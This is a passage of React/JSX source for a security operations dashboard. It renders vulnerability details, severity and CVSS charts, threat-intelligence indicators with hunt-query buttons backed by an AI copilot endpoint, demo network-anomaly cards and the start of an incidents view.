                              {vuln.cve && vuln.cve!=='null' && <a href={`https://nvd.nist.gov/vuln/detail/${vuln.cve}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#4f8fff15',border:'1px solid #4f8fff30',color:'#4f8fff',textDecoration:'none',fontSize:'0.82rem',fontWeight:700}}>🔗 NVD</a>}
                              {vuln.kev && <a href='https://www.cisa.gov/known-exploited-vulnerabilities-catalog' target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#f9731615',border:'1px solid #f9731630',color:'#f97316',textDecoration:'none',fontSize:'0.82rem',fontWeight:700}}>⚠ CISA KEV</a>}
                              <a href={`https://www.google.com/search?q=${encodeURIComponent((vuln.cve||vuln.title)+' patch download fix')}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#22d49a15',border:'1px solid #22d49a30',color:'#22d49a',textDecoration:'none',fontSize:'0.82rem',fontWeight:700}}>📦 Find Patch</a>
                              {vuln.source==='Tenable'&&vuln.cve&&vuln.cve!=='null'&&<a href={`https://www.tenable.com/plugins/search?q=${encodeURIComponent(vuln.cve)}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#00b3e315',border:'1px solid #00b3e330',color:'#00b3e3',textDecoration:'none',fontSize:'0.82rem',fontWeight:700}}>🔍 Tenable Plugin</a>}
                            </div>
                          </div>
                          <div>
                            <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Remediation Steps</div>
                            {(vuln.remediation||[vuln.description||'See NVD for remediation guidance.']).map((r,i)=>(
                              <div key={r} style={{fontSize:'0.86rem',color:'var(--wt-secondary)',padding:'3px 0 3px 14px',position:'relative',lineHeight:1.5}}>
                                <span style={{position:'absolute',left:0,top:9,width:5,height:5,borderRadius:'50%',background:'#22d49a',display:'block'}} />
                                {r}
                              </div>
                            ))}
                            <div style={{marginTop:12,padding:'10px',background:'var(--wt-card2)',border:'1px solid #4f8fff18',borderRadius:8}}>
                              <div style={{fontSize:'0.84rem',fontWeight:700,color:'#4f8fff',marginBottom:8,display:'flex',alignItems:'center',gap:6}}>
                                <span style={{width:6,height:6,borderRadius:'50%',background:'#4f8fff',display:'block'}} />AI Remediation Assistant
                              </div>
                              <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:8}}>
                                {[
                                  {type:'splunk',label:'Splunk',color:'#f97316'},
                                  {type:'sentinel',label:'Sentinel',color:'#4f8fff'},
                                  {type:'defender',label:'Defender',color:'#22d49a'},
                                  {type:'iocs',label:'IOCs',color:'#f0405e'},
                                ].map(q=>{
                                  const key = vuln.id + ':' + q.type;
                                  const isLoading = vulnAiLoading === key;
                                  const hasResult = !!vulnAiTexts[key];
                                  return (
                                    <button key={q.type} onClick={()=>getVulnAiHelp(vuln,q.type)} disabled={isLoading} style={{padding:'4px 11px',borderRadius:5,border:'1px solid ' + q.color + '40',background:hasResult ? q.color + '20' : 'transparent',color:q.color,fontSize:'0.82rem',fontWeight:700,cursor:isLoading?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4,opacity:isLoading?0.7:1}}>
                                      {isLoading && <span style={{display:'inline-block',width:8,height:8,borderRadius:'50%',border:'2px solid ' + q.color,borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}} />}
                                      {!isLoading && hasResult && <span>✓</span>}
                                      {!isLoading && !hasResult && <span>✦</span>}
                                      {q.label}
                                    </button>
                                  );
                                })}
                                {['splunk','sentinel','defender','iocs'].some(t=>vulnAiTexts[vuln.id+':'+t]) && (
                                  <button onClick={()=>setVulnAiTexts(prev=>{const n={...prev};['splunk','sentinel','defender','iocs'].forEach(t=>{delete n[vuln.id+':'+t];}); return n;})} style={{marginLeft:'auto',fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-dim)',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear all</button>
                                )}
                              </div>
                              {['splunk','sentinel','defender','iocs'].map(t=>{
                                const key = vuln.id + ':' + t;
                                if (!vulnAiTexts[key]) return null;
                                const colors = {splunk:'#f97316',sentinel:'#4f8fff',defender:'#22d49a',iocs:'#f0405e'};
                                const labels = {splunk:'Splunk SPL',sentinel:'Sentinel KQL',defender:'Defender KQL',iocs:'IOCs'};
                                return (
                                  <div key={t} style={{marginBottom:8}}>
                                    <div style={{fontSize:'0.82rem',fontWeight:700,color:colors[t],marginBottom:4,textTransform:'uppercase',letterSpacing:'0.5px'}}>{labels[t]}</div>
                                    <RemediationOutput text={vulnAiTexts[key]} />
                                  </div>
                                );
                              })}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                  ))
                })()}
                </div>
              </div>

              {/* RIGHT — donut + metrics */}
              <div style={{display:'flex',flexDirection:'column',gap:10}}>
                {(()=>{
                  const sevColors={Critical:'#f0405e',High:'#f97316',Medium:'#f0a030',Low:'#4f8fff'};
                  const counts=['Critical','High','Medium','Low'].map(s=>({sev:s,n:vulns.filter(v=>v.severity===s).length,color:sevColors[s]})).filter(x=>x.n>0);
                  const total=counts.reduce((a,b)=>a+b.n,0);
                  if(!total) return null;
                  const R=50,SW=11,CX=68,CY=68,CIRC=2*Math.PI*R;
                  let offset=0;
                  const segs=counts.map(c=>{const pct=c.n/total;const dash=pct*CIRC;const seg={...c,dash,gap:CIRC-dash,offset};offset+=dash;return seg;});
                  return (
                    <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px'}}>
                      <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:12}}>Severity Breakdown</div>
                      <div style={{display:'flex',alignItems:'center',gap:12}}>
                        <svg width={136} height={136} viewBox={`0 0 ${CX*2} ${CY*2}`} style={{flexShrink:0}}>
                          {segs.map((seg,i)=>(
                            <circle key={i} cx={CX} cy={CY} r={R} fill='none' stroke={seg.color} strokeWidth={SW}
                              strokeDasharray={`${seg.dash} ${seg.gap}`} strokeDashoffset={-seg.offset}
                              style={{transform:'rotate(-90deg)',transformOrigin:`${CX}px ${CY}px`}} />
                          ))}
                          <text x={CX} y={CY-5} textAnchor='middle' fill='#e8ecf4' fontSize={20} fontWeight={900} fontFamily='JetBrains Mono,monospace'>{total}</text>
                          <text x={CX} y={CY+12} textAnchor='middle' fill='#6b7a94' fontSize={10} fontFamily='Inter,sans-serif'>vulns</text>
                        </svg>
                        <div style={{display:'flex',flexDirection:'column',gap:7,flex:1}}>
                          {segs.map(seg=>(
                            <div key={seg.sev} style={{display:'flex',alignItems:'center',gap:6}}>
                              <span style={{width:7,height:7,borderRadius:'50%',background:seg.color,flexShrink:0}} />
                              <span style={{fontSize:'0.84rem',fontWeight:600,flex:1}}>{seg.sev}</span>
                              <span style={{fontSize:'0.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:seg.color}}>{seg.n}</span>
                              <span style={{fontSize:'0.8rem',color:'var(--wt-dim)',minWidth:28,textAlign:'right'}}>{Math.round(seg.n/total*100)}%</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  );
                })()}

                {/* Key metrics */}
                <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:6}} className='wt-two-col'>
                  {[
                    {label:'KEV Active',val:kevVulns.length,color:'#f97316',icon:'⚠'},
                    {label:'Avg CVSS',val:(()=>{const withCvss=vulns.filter(v=>v.cvss&&v.cvss!=='N/A'&&Number(v.cvss)>0);return withCvss.length?(withCvss.reduce((a,v)=>a+Number(v.cvss),0)/withCvss.length).toFixed(1):'—';})(),color:'#8b6fff',icon:'📊'},
                    {label:'Devices Exposed',val:[...new Set(vulns.flatMap(v=>v.affectedAssets||v.affectedDevices||[]))].length,color:'#f0405e',icon:'💻'},
                    {label:'Total Vulns',val:vulns.length,color:'#4f8fff',icon:'🔍'},
                  ].map(m=>(
                    <div key={m.label} style={{padding:'10px 12px',background:'var(--wt-card)',border:`1px solid ${m.color}18`,borderRadius:9,textAlign:'center'}}>
                      <div style={{fontSize:'0.75rem',marginBottom:2}}>{m.icon}</div>
                      <div style={{fontSize:'1.3rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:m.color,lineHeight:1}}>{m.val}</div>
                      <div style={{fontSize:'0.86rem',color:'var(--wt-dim)',marginTop:2}}>{m.label}</div>
                    </div>
                  ))}
                </div>

                {/* CVSS distribution */}
                <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px 16px'}}>
                  <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:10}}>CVSS Distribution</div>
                  {[{label:'Critical 9+',min:9,max:11,color:'#f0405e'},{label:'High 7–9',min:7,max:9,color:'#f97316'},{label:'Medium 4–7',min:4,max:7,color:'#f0a030'},{label:'Low 0–4',min:0,max:4,color:'#4f8fff'}].map(b=>{
                    const n=vulns.filter(v=>(v.cvss||0)>=b.min&&(v.cvss||0)<b.max).length;
                    if(!n) return null;
                    return (
                      <div key={b.label} style={{marginBottom:7}}>
                        <div style={{display:'flex',justifyContent:'space-between',marginBottom:2}}>
                          <span style={{fontSize:'0.86rem',color:'var(--wt-muted)'}}>{b.label}</span>
                          <span style={{fontSize:'0.86rem',fontWeight:700,color:b.color}}>{n}</span>
                        </div>
                        <div style={{height:4,borderRadius:2,background:'var(--wt-border)',overflow:'hidden'}}>
                          <div style={{height:'100%',borderRadius:2,background:b.color,width:`${Math.round(n/Math.max(vulns.length,1)*100)}%`,transition:'width .5s'}} />
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Most vulnerable devices */}
                {(()=>{
                  const dc={};
                  vulns.forEach(v=>(v.affectedAssets||v.affectedDevices||[]).forEach(d=>{dc[d]=(dc[d]||0)+1;}));
                  const top=Object.entries(dc).sort((a,b)=>b[1]-a[1]).slice(0,5);
                  if(!top.length) return null;
                  return (
                    <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px 16px'}}>
                      <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Most Exposed Devices</div>
                      {top.map(([device,count])=>(
                        <div key={device} style={{display:'flex',alignItems:'center',gap:8,padding:'4px 0',borderBottom:'1px solid var(--wt-border)'}}>
                          <span style={{fontSize:'0.8rem',fontFamily:'JetBrains Mono,monospace',flex:1,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{device}</span>
                          <span style={{fontSize:'0.82rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#f0405e18',color:'#f0405e'}}>{count}</span>
                        </div>
                      ))}
                    </div>
                  );
                })()}
              </div>
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ INTEL ══════════════════════════════════ */}
          {activeTab==='intel' && (
            <GateWall feature='Threat Intelligence' requiredTier='team' userTier={userTier} isAdmin={isAdmin}>
            <div style={{display:'flex',flexDirection:'column',gap:12}}>
              <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Threat Intelligence</h2>
                <div style={{display:'flex',alignItems:'center',gap:6,marginLeft:'auto'}}>
                  <span style={{fontSize:'0.86rem',color:'var(--wt-muted)'}}>Industry:</span>
                  <select value={industry} onChange={e=>{setIndustryPersisted(e.target.value);fetchIntelForIndustry(e.target.value);}} style={{padding:'4px 10px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'var(--wt-card2)',color:'var(--wt-text)',fontSize:'0.84rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
                    {INDUSTRIES.map(i=><option key={i} value={i}>{i}</option>)}
                  </select>
                  {intelLoading
                    ? <span style={{width:14,height:14,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}} />
                    : <button onClick={()=>fetchIntelForIndustry(industry)} title='Refresh threat intel' style={{padding:'3px 10px',borderRadius:5,border:'1px solid #4f8fff28',background:'#4f8fff0a',color:'#4f8fff',fontSize:'0.8rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>⟳ Refresh</button>
                  }
                  {customIntel && !demoMode && (
                    <span style={{fontSize:'0.84rem',color:'#22d49a',background:'#22d49a0a',padding:'2px 8px',borderRadius:4,border:'1px solid #22d49a25',fontWeight:600}}>
                      ✦ LIVE · {customIntel.length} items{intelFetchedAt ? ` · ${Math.floor((Date.now()-new Date(intelFetchedAt).getTime())/60000)}m ago` : ''}{customIntel.some(i=>i.fromConnectedTool)?' · from connected tools':''}
                    </span>
                  )}
                  {!customIntel && !demoMode && !intelLoading && (
                    <span style={{fontSize:'0.84rem',color:'#f0a030',padding:'2px 8px',borderRadius:4,border:'1px solid #f0a03025',fontWeight:600}}>Demo data · no API key</span>
                  )}
                </div>
              </div>

              {/* Industry-specific intel first — 3 column grid */}
              <div>
                <div style={{fontSize:'0.86rem',fontWeight:700,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8,display:'flex',alignItems:'center',gap:8}}>
                  {industry} — Active Threats
                  <span style={{fontSize:'0.86rem',fontWeight:600,color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{industryIntel.filter(i=>i.industrySpecific).length} items</span>
                </div>
                <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}} className='wt-three-col'>
                {industryIntel.filter(i=>i.industrySpecific).slice(0,6).map(item=>{
                  const isExpanded = expandedIntel.has(item.id);
                  return (
                  <div key={item.id} style={{background:'#0a0206',border:`1px solid ${isExpanded?'#f0405e30':'#f0405e18'}`,borderRadius:10,overflow:'hidden',gridColumn:isExpanded?'1 / -1':'auto'}}>
                    <div style={{padding:'12px 14px',cursor:'pointer'}} onClick={()=>toggleIntel(item.id)}>
                      <div style={{display:'flex',alignItems:'flex-start',gap:10}}>
                        <div style={{flex:1}}>
                          <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:4}}>
                            <SevBadge sev={item.severity} />
                            <span style={{fontSize:'0.84rem',fontWeight:700}}>{item.title}</span>
                          </div>
                          <div style={{fontSize:'0.86rem',color:'var(--wt-secondary)',lineHeight:1.6,marginBottom:6,display:'-webkit-box',WebkitLineClamp:isExpanded?999:2,WebkitBoxOrient:'vertical',overflow:'hidden'}}>{item.summary}</div>
                          <div style={{display:'flex',gap:6,alignItems:'center',flexWrap:'wrap'}}>
                            <span style={{fontSize:'0.8rem',color:'#4f8fff'}}>{item.source}</span>
                            <span style={{fontSize:'0.8rem',color:'var(--wt-dim)'}}>{item.time}</span>
                            {item.iocs && item.iocs.length>0 && <span style={{fontSize:'0.86rem',fontWeight:700,color:'#f0a030',background:'#f0a03012',padding:'1px 5px',borderRadius:3}}>{item.iocs.length} IOCs</span>}
                            <a href={(item.url||'').startsWith('http')?item.url:`https://www.ncsc.gov.uk/search?q=${encodeURIComponent(item.title)}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.84rem',color:'#4f8fff',textDecoration:'none',padding:'1px 5px',border:'1px solid #4f8fff20',borderRadius:3}}>↗</a>
                          </div>
                        </div>
                        <span style={{fontSize:'0.86rem',color:'var(--wt-dim)',flexShrink:0}}>{isExpanded?'▲':'▼'}</span>
                      </div>
                    </div>
                    {isExpanded && item.iocs && item.iocs.length>0 && (
                      <div style={{padding:'10px 14px 14px',borderTop:'1px solid #f0405e15',background:'#07010a'}}>
                        <div style={{fontSize:'0.84rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Indicators of Compromise</div>
                        <div style={{display:'flex',flexDirection:'column',gap:4}}>
                          {item.iocs.map(ioc=>(
                            <div key={ioc} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 8px',background:'#0d0208',border:'1px solid #1e1010',borderRadius:6}}>
                              <span style={{width:6,height:6,borderRadius:'50%',background:'#f0a030',flexShrink:0}} />
                              <code style={{fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'#f0c070',flex:1,wordBreak:'break-all'}}>{ioc}</code>
                              <button onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(ioc);}} style={{fontSize:'0.86rem',padding:'2px 7px',borderRadius:3,border:'1px solid #f0a03025',background:'transparent',color:'#f0a030',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Copy</button>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                  );
                })}
                </div>
              </div>

              {/* Live data from connected threat intel tools — only show when tools are connected */}
              {(()=>{
                const connectedIntelItems = !demoMode && customIntel ? customIntel.filter(i=>i.fromConnectedTool) : [];
                if (!connectedIntelItems.length) return null;
                // Group by source tool
                const bySource = connectedIntelItems.reduce((acc, item) => {
                  const src = item.source || 'Connected Tool';
                  if (!acc[src]) acc[src] = [];
                  acc[src].push(item);
                  return acc;
                }, {});
                return (
                  <div>
                    <div style={{fontSize:'0.86rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8,display:'flex',alignItems:'center',gap:8}}>
                      <span style={{width:6,height:6,borderRadius:'50%',background:'#22d49a',boxShadow:'0 0 5px #22d49a',display:'block'}} />
                      Live — Connected Threat Intel Tools
                      <span style={{fontSize:'0.86rem',fontWeight:600,color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{connectedIntelItems.length} items</span>
                    </div>
                    {Object.entries(bySource).map(([source, items])=>(
                      <div key={source} style={{marginBottom:12}}>
                        <div style={{fontSize:'0.84rem',fontWeight:700,color:'#22d49a',marginBottom:6,display:'flex',alignItems:'center',gap:6}}>
                          <span>{source}</span>
                          <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',fontWeight:400}}>{items.length} indicator{items.length!==1?'s':''}</span>
                        </div>
                        <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}} className='wt-three-col'>
                        {items.slice(0,6).map((item,i)=>{
                          const isExpanded = expandedIntel.has(item.id);
                          const c = {Critical:'#f0405e',High:'#f97316',Medium:'#f0a030',Low:'#4f8fff'}[item.severity]||'#6b7a94';
                          return (
                            <div key={item.id||i} style={{background:'var(--wt-card)',border:`1px solid ${isExpanded?'#22d49a30':'#22d49a12'}`,borderRadius:10,overflow:'hidden',gridColumn:isExpanded?'1 / -1':'auto'}}>
                              <div style={{padding:'10px 14px',cursor:'pointer'}} onClick={()=>toggleIntel(item.id)}>
                                <div style={{display:'flex',alignItems:'flex-start',gap:7,marginBottom:4}}>
                                  <SevBadge sev={item.severity} />
                                  <span style={{fontSize:'0.8rem',fontWeight:700,flex:1,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{item.title}</span>
                                  <span style={{fontSize:'0.82rem',color:'var(--wt-dim)',flexShrink:0}}>{isExpanded?'▲':'▼'}</span>
                                </div>
                                <div style={{fontSize:'0.84rem',color:'var(--wt-secondary)',lineHeight:1.55,marginBottom:5,display:'-webkit-box',WebkitLineClamp:isExpanded?999:2,WebkitBoxOrient:'vertical',overflow:'hidden'}}>{item.summary}</div>
                                <div style={{display:'flex',gap:5,alignItems:'center',flexWrap:'wrap'}}>
                                  <span style={{fontSize:'0.86rem',color:'#22d49a'}}>{item.time}</span>
                                  {item.iocs && item.iocs.length>0 && <span style={{fontSize:'0.84rem',fontWeight:700,color:'#f0a030',background:'#f0a03012',padding:'1px 5px',borderRadius:3}}>{item.iocs.length} IOCs</span>}
                                  {item.mitre && <span style={{fontSize:'0.84rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{item.mitre}</span>}
                                  {item.url && <a href={(item.url||'').startsWith('http')?item.url:'#'} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.84rem',color:'#4f8fff',textDecoration:'none',padding:'1px 5px',border:'1px solid #4f8fff20',borderRadius:3}}>↗</a>}
                                </div>
                              </div>
                              {isExpanded && item.iocs && item.iocs.length>0 && (
                                <div style={{padding:'8px 14px 12px',borderTop:'1px solid #22d49a15',background:'var(--wt-card2)'}}>
                                  <div style={{fontSize:'0.82rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6}}>Indicators</div>
                                  <div style={{display:'flex',flexDirection:'column',gap:3}}>
                                    {item.iocs.map(ioc=>(
                                      <div key={ioc} style={{display:'flex',alignItems:'center',gap:6,padding:'3px 6px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:5}}>
                                        <span style={{width:5,height:5,borderRadius:'50%',background:'#f0a030',flexShrink:0}} />
                                        <code style={{fontSize:'0.82rem',fontFamily:'JetBrains Mono,monospace',color:'#f0c070',flex:1,wordBreak:'break-all'}}>{ioc}</code>
                                        <button onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(ioc);}} style={{fontSize:'0.84rem',padding:'1px 6px',borderRadius:3,border:'1px solid #f0a03025',background:'transparent',color:'#f0a030',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Copy</button>
                                      </div>
                                    ))}
                                  </div>
                                  {/* Per-tool hunt queries */}
                                  <div style={{marginTop:8,paddingTop:8,borderTop:'1px solid var(--wt-border)'}}>
                                    <div style={{display:'flex',gap:4,flexWrap:'wrap'}}>
                                      {[{tool:'splunk',label:'Splunk',color:'#f97316'},{tool:'sentinel',label:'Sentinel',color:'#4f8fff'},{tool:'defender',label:'Defender',color:'#22d49a'},{tool:'elastic',label:'Elastic',color:'#00bfb3'}].map(({tool,label,color})=>{
                                        const key=item.id+':'+tool;
                                        const isLoading=iocQueryLoading===key;
                                        const hasResult=!!iocQueries[key];
                                        return (<button key={tool} onClick={e=>{e.stopPropagation();if(isLoading)return;setIocQueryLoading(key);const toolLabel={'splunk':'Splunk SPL','sentinel':'Microsoft Sentinel KQL','defender':'Microsoft Defender Advanced Hunting','elastic':'Elastic EQL'}[tool];fetch('/api/copilot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({industry:'ioc_hunt',prompt:'Generate a '+toolLabel+' query to hunt for these IOCs: '+item.iocs.join(', ')+'. Provide ONLY the raw query, no preamble.'})}).then(r=>r.json()).then(d=>{setIocQueries(prev=>({...prev,[key]:d.response||''}));setIocQueryLoading(null);}).catch(()=>setIocQueryLoading(null));}} disabled={isLoading} style={{padding:'3px 8px',borderRadius:4,border:`1px solid ${color}40`,background:hasResult?`${color}20`:'transparent',color,fontSize:'0.82rem',fontWeight:700,cursor:isLoading?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:3,opacity:isLoading?0.7:1}}>{isLoading&&<span style={{display:'inline-block',width:6,height:6,borderRadius:'50%',border:`2px solid ${color}`,borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}} />}{!isLoading&&hasResult&&'✓'}{label}</button>);
                                      })}
                                    </div>
                                    {[{tool:'splunk',label:'Splunk SPL',color:'#f97316'},{tool:'sentinel',label:'Sentinel KQL',color:'#4f8fff'},{tool:'defender',label:'Defender AH',color:'#22d49a'},{tool:'elastic',label:'Elastic EQL',color:'#00bfb3'}].map(({tool,label,color})=>{const key=item.id+':'+tool;if(!iocQueries[key])return null;return(<div key={tool} style={{marginTop:6}}><div style={{fontSize:'0.84rem',fontWeight:700,color,textTransform:'uppercase',marginBottom:3}}>{label}</div><RemediationOutput text={iocQueries[key]} /></div>);})}
                                  </div>
                                </div>
                              )}
                            </div>
                          );
                        })}
                        </div>
                      </div>
                    ))}
                  </div>
                );
              })()}

              {/* Tenable — In The News — 3 columns */}
              <div>
                <div style={{fontSize:'0.86rem',fontWeight:700,color:'#00b3e3',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8,display:'flex',alignItems:'center',gap:8}}>
                  Tenable Research
                  <span style={{fontSize:'0.86rem',fontWeight:600,color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>in the news</span>
                </div>
                <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8,minWidth:0}} className='wt-three-col'>
                {tenableNewsItems.slice(0,3).map(item=>(
                  <div key={item.id} style={{background:'var(--wt-card)',border:'1px solid #00b3e318',borderRadius:10,padding:'12px 14px',minWidth:0,overflow:'hidden'}}>
                    <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:4}}>
                      <SevBadge sev={item.severity} />
                      <span style={{fontSize:'0.82rem',fontWeight:700,flex:1,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap',minWidth:0}}>{item.title}</span>
                    </div>
                    <div style={{fontSize:'0.82rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:6}}>{item.summary}</div>
                    <div style={{display:'flex',gap:8,alignItems:'center',flexWrap:'wrap'}}>
                      <span style={{fontSize:'0.82rem',color:'#00b3e3',fontWeight:600}}>{item.source}</span>
                      <span style={{fontSize:'0.82rem',color:'var(--wt-dim)'}}>{item.time}</span>
                      {item.iocs&&item.iocs.map(cve=><span key={cve} style={{fontSize:'0.84rem',color:'#f97316',fontFamily:'JetBrains Mono,monospace',padding:'1px 5px',border:'1px solid #f9731625',borderRadius:3,background:'#f9731610'}}>{cve}</span>)}
                      {item.mitre&&<span style={{fontSize:'0.84rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{item.mitre}</span>}
                      <a href={(item.url||'').startsWith('http')?item.url:'#'} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.84rem',color:'#00b3e3',textDecoration:'none',padding:'1px 5px',border:'1px solid #00b3e320',borderRadius:3}}>↗ Read</a>
                    </div>
                  </div>
                ))}
                </div>
              </div>

              {/* Darktrace anomalies if active */}
              {darktrace?.active && (
                <div>
                  <div style={{fontSize:'0.86rem',fontWeight:700,color:'#8b6fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Darktrace — Network Anomalies</div>
                  {[
                    {device:'SRV-FINANCE01',score:96,desc:'Anomalous outbound HTTPS beaconing — 300s interval, unusual destination',time:'1h ago'},
                    {device:'laptop-CFO01',score:88,desc:'Unusual internal reconnaissance — scanning 10.0.0.0/24 subnet',time:'2h ago'},
                    {device:'SRV-APP02',score:72,desc:'Elevated data transfer to external storage provider — 3x baseline',time:'3h ago'},
                  ].map(a=>(
                    <div key={a.device} style={{padding:'10px 14px',background:'var(--wt-card)',border:'1px solid #8b6fff18',borderRadius:10,marginBottom:5,display:'flex',alignItems:'center',gap:10}}>
                      <div style={{width:38,height:38,borderRadius:8,background:'#8b6fff15',display:'flex',alignItems:'center',justifyContent:'center',flexShrink:0}}>
                        <span style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:'#8b6fff'}}>{a.score}</span>
                      </div>
                      <div style={{flex:1}}>
                        <div style={{fontSize:'0.84rem',fontWeight:700,marginBottom:2}}>{a.device}</div>
                        <div style={{fontSize:'0.86rem',color:'var(--wt-muted)'}}>{a.desc}</div>
                      </div>
                      <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',flexShrink:0}}>{a.time}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </GateWall>
          )}

          {/* ═══════════════════════════════ INCIDENTS ══════════════════════════════ */}
          {activeTab==='incidents' && (
            <GateWall feature='Incident Management' requiredTier='team' userTier={isAdmin?'team':userTier} isAdmin={isAdmin}>
            <div style={{display:'flex',flexDirection:'column',gap:12}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Incidents</h2>
                <span style={{fontSize:'0.86rem',color:'#f0405e',background:'#f0405e12',padding:'2px 8px',borderRadius:4}}>{incidents.filter(i=>(incidentStatuses[i.id]||i.status)==='Active').length} Active</span>
                <span style={{fontSize:'0.86rem',color:'#8b6fff',background:'#8b6fff12',padding:'2px 8px',borderRadius:4}}>{incidents.filter(i=>(incidentStatuses[i.id]||i.status)==='Escalated').length} Escalated</span>
                {incidents.filter(i=>(incidentStatuses[i.id]||i.status)==='Resolved').length>0 && <span style={{fontSize:'0.86rem',color:'#22d49a',background:'#22d49a12',padding:'2px 8px',borderRadius:4}}>{incidents.filter(i=>(incidentStatuses[i.id]||i.status)==='Resolved').length} Resolved</span>}
                <span style={{marginLeft:'auto',fontSize:'0.82rem',color:'var(--wt-dim)'}}>{incidents.filter(i=>!deletedIncidents.has(i.id)).length} total</span>
              </div>

              {/* Analyst workload */}
              {(()=>{
                const analysts = {};
                incidents.filter(i=>!deletedIncidents.has(i.id)).forEach(inc=>{
                  const name = inc.assignedTo || 'Unassigned';
                  if (!analysts[name]) analysts[name] = {active:0,escalated:0,contained:0,resolved:0,total:0};
                  const st = incidentStatuses[inc.id] || inc.status;
                  analysts[name].total++;
                  if (st==='Active') analysts[name].active++;
                  else if (st==='Escalated') analysts[name].escalated++;
                  else if (st==='Contained') analysts[name].contained++;
                  else analysts[name].resolved++;
                });
                const entries = Object.entries(analysts).sort((a,b)=>b[1].total-a[1].total);
                if (entries.length < 2) return null;
                return (
                  <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'12px 16px'}}>
